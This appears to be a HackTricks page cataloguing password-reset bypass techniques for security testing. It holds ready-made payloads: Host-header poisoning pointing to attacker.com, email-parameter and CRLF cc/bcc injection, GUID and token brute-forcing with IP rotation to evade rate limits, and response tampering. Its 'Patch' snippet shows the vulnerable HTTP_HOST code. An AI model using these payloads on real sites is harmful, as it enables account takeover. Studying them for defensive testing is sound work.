# Reset/Forgotten Password Bypass

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>

​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.

{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}



The following techniques recompilation was taken from [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Password Reset Token Leak Via Referrer

The **HTTP referer** is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested. The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Exploitation

* Request password reset to your email address
* Click on the password reset link
* Dont change password
* Click any 3rd party websites(eg: Facebook, twitter)
* Intercept the request in burpsuite proxy
* Check if the referer header is leaking password reset token.

### Impact

It allows the person who has control of particular site to change the user’s password (CSRF attack), because this person knows reset password token of the user.

### Reference:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Password Reset Poisoning

If you find a host header attack and it’s out of scope, try to find the password reset button!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Exploitation

* Intercept the password reset request in Burpsuite
* Add following header or edit header in burpsuite(try one by one)

```
Host: attacker.com
```

```
 Host: target.com
 X-Forwarded-Host: attacker.com
```

```
 Host: target.com
 Host: attacker.com
```

* Check if the link to change the password inside the email is pointing to attacker.com

### Patch

Use `$_SERVER['SERVER_NAME']` rather than `$_SERVER['HTTP_HOST']`

```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```

### Impact

The victim will receive the malicious link in their email, and, when clicked, will leak the user’s password reset link / token to the attacker, leading to full account takeover.

### Reference:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## Password Reset With Manipualating Email Parameter

### Exploitation

* Add attacker email as second parameter using &

```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```

* Add attacker email as second parameter using %20

```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```

* Add attacker email as second parameter using |

```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```

* Add attacker email as second parameter using cc

```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

* Add attacker email as second parameter using bcc

```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```

* Add attacker email as second parameter using ,

```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```

* Add attacker email as second parameter in json array

```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```

### Reference

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Changing Email And Password of any User through API Parameters

### Exploitation

* Attacker have to login with their account and Go to the Change password function
* Start the Burp Suite and Intercept the request
* After intercepting the request sent it to repeater and modify parameters Email and Password

```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```

### Reference

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### No Rate Limiting: Email Bombing <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Exploitation

* Start the Burp Suite and Intercept the password reset request
* Send to intruder
* Use null payload

### Reference

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Find out How Password Reset Token is Generated

Figure out the pattern of password reset token

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

If it

* Generated based Timestamp
* Generated based on the UserID
* Generated based on email of User
* Generated based on Firstname and Lastname
* Generated based on Date of Birth
* Generated based on Cryptography

Use Burp Sequencer to find the randomness or predictability of tokens.

## Guessable GUID

There are different types of GUIDs:

* **Version 0:** Only seen in the nil GUID ("00000000-0000-0000-0000-000000000000").
* **Version 1:** The GUID is generated in a predictable manner based on:
  * The current time
  * A randomly generated "clock sequence" which remains constant between GUIDs during the uptime of the generating system
  * A "node ID", which is generated based on the system's MAC address if it is available
* **Version 3:** The GUID is generated using an MD5 hash of a provided name and namespace.
* **Version 4:** The GUID is randomly generated.
* **Version 5:** The GUID is generated using a SHA1 hash of a provided name and namespace.

It's possible to take a look to a GUID and find out its version, there is a small tool for that: [**guidtool**](https://github.com/intruder-io/guidtool)****

```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```

If the used version to generate a reset password GUID is the version 1, it's possible to bruteforce GUIDS:

```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```

### References

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Response manipulation: Replace Bad Response With Good One

Look for Request and Response like these

```php
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
```

Change Response

```php
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```

### Reference

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Using Expired Token <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* Check if the expired token can be reused

### Brute Force Password Rest token <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Try to bruteforce the reset token using Burpsuite

```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```

* Use IP-Rotator on burpsuite to bypass IP based ratelimit.

### Reference

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Try Using Your Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Try adding your password reset token with victim’s Account

```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```

### Reference

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Session I**nvalidation** in Logout/Password Reset

When a user **logs out or reset his password**, the current session should be invalidated.\
Therefore, **grab the cookies** while the user is logged in, **log out**, and **check** if the **cookies** are still **valid**.\
Repeat the process **changing the password** instead of logging out.

## Reset Token expiration Time

The **reset tokens must have an expiration time**, after it the token shouldn't be valid to change the password of a user.

## Extra Checks

* Use username@burp\_collab.net and analyze the callback
* User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* Long password (>200) leads to DoS
* Append second email param and value



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>

​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.

{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
